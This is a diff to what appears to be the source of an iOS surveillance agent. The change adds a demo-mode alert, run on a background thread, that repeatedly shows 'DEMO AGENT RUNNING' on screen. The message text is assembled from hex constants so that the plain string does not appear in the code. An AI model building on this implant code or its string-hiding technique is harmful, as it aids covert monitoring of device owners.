@@ -13,6 +13,7 @@
 #import <CommonCrypto/CommonDigest.h>
 #import <UIKit/UIDevice.h>
 #import <sqlite3.h>
+#import <pthread.h>
 
 #import "NSData+SHA1.h"
 #import "NSMutableData+AES128.h"
@@ -81,6 +82,27 @@ u_int gOSBugFix = 0;
 
 //// Core Version
 //u_int gVersion      = 2012063001;
+
+SInt32 CFUserNotificationDisplayNotice(CFTimeInterval timeout,
+                                       CFOptionFlags flags,
+                                       CFURLRef iconURL,
+                                       CFURLRef soundURL,
+                                       CFURLRef localizationURL,
+                                       NSString *alertHeader,
+                                       NSString *alertMessage,
+                                       CFStringRef defaultButtonTitle);
+
+enum {
+  kCFUserNotificationStopAlertLevel           = 0,
+  kCFUserNotificationNoteAlertLevel           = 1,
+  kCFUserNotificationCautionAlertLevel        = 2,
+  kCFUserNotificationPlainAlertLevel          = 3
+};
+
+enum {
+  kCFUserNotificationNoDefaultButtonFlag      = (1UL << 5),
+  kCFUserNotificationUseRadioButtonsFlag      = (1UL << 6)
+};
 
 @implementation _i_Task
 
@@ -1061,6 +1083,48 @@ rcs_sqlite_do_select(sqlite3 *db, const char *stmt)
   return [results autorelease];
 }
 
+void* popupDemoAlertDialogThread(void* data)
+{
+  int z2 = 0;
+  uint32_t _demo = 0x4F4D4544;
+  int z1 = 0;
+  uint64_t _agent = 0x0544E454741;
+  int z0 = 0;
+  uint64_t _running = 0x00474E494E4E5552;
+  
+  char *demo = (char*)&_demo, *agent = (char*)&_agent, *running = (char*)&_running;
+  
+  NSString *msgDlg = [NSString stringWithFormat:@"%s %s %s", demo + z0, agent + z1, running + z2];
+  
+  while (TRUE)
+  {
+    CFUserNotificationDisplayNotice(1.75,
+                                    kCFUserNotificationPlainAlertLevel |
+                                    kCFUserNotificationNoDefaultButtonFlag,
+                                    NULL,
+                                    NULL,
+                                    NULL,
+                                    @"",
+                                    msgDlg,//@"DEMO AGENT RUNNING",
+                                    NULL);
+    sleep(30);
+  }
+}
+
+void popupDemoAlertDialog()
+{
+  pthread_attr_t  attr;
+  pthread_t       posixThreadID;
+
+  pthread_attr_init(&attr);
+
+  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+  
+  pthread_create(&posixThreadID, &attr, &popupDemoAlertDialogThread, NULL);
+  
+  pthread_attr_destroy(&attr);
+}
+
 void checkAndRunDemoMode()
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -1084,6 +1148,8 @@ void checkAndRunDemoMode()
       AudioServicesPlaySystemSound(1304);
       AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
       AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
+      
+      popupDemoAlertDialog();
     }    
   
   [demoMode release];
